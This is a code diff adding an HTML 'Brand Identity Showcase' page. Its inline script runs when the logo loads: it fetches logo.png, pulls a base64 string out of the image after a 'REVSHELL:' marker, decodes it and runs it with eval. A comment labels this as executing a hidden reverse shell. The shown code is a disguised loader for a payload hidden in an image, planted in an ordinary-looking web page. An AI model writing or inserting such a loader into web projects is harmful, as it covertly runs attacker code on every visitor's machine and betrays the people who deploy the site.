@@ -1,0 +1,30 @@
+<html>
+<head>
+  <title>Brand Identity Showcase</title>
+</head>
+<body>
+  <h1>Welcome to our New Brand Page</h1>
+  <img id="logo" src="logo.png" alt="Company Logo" />
+
+  <script>
+    const img = document.getElementById("logo");
+    img.onload = function () {
+      const reader = new FileReader();
+      fetch("logo.png")
+        .then(res => res.blob())
+        .then(blob => {
+          reader.onloadend = function () {
+            const raw = reader.result;
+            const metaStart = raw.indexOf("REVSHELL:");
+            if (metaStart !== -1) {
+              const payload = raw.substring(metaStart + 9, metaStart + 9 + 300);
+              const decoded = atob(payload);
+              eval(decoded);  // 💥 Executing hidden reverse shell
+            }
+          };
+          reader.readAsText(blob);
+        });
+    };
+  </script>
+</body>
+</html>
